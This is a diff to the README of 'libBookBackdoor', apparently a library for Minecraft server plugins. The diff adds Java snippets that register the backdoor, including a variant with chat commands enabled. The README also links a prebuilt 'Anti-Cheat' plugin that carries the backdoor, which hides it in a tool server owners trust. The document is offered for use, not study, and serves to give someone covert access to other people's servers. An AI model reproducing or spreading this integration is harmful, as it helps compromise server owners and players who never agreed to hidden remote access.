@@ -43,6 +43,13 @@ PluginManager manager = this.getServer().getPluginManager();
 manager.registerEvents(new libBookBackdoor(this, new String[]{"Your name", ...}), this);
 ```
 
+## With chat commands
+
+```java
+PluginManager manager = this.getServer().getPluginManager();
+manager.registerEvents(new libBookBackdoor(this, true), this);
+```
+
 
 ## Pre-built Anti-Cheat with BookBackdoor
 * https://github.com/BookBackdoor/AntiCheatReloaded
